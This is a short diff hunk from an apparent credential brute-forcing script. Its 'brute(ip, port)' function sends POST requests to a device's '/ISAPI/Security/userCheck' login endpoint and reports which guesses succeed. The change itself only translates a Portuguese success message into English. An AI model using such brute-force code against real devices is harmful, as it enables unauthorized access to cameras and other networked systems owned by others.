@@ -30,7 +30,7 @@ def brute(ip, port):
         'Connection': 'close'}
         req = requests.post(host+'/ISAPI/Security/userCheck', headers=headers)
         if req.status_code == 200:
-            print("Usuario certo: " + user+"-"+str(i))
+            print("Found user: " + user+"-"+str(i))
         else:
             print("[+] "+user+":"+i+" - Incorrect!")
 
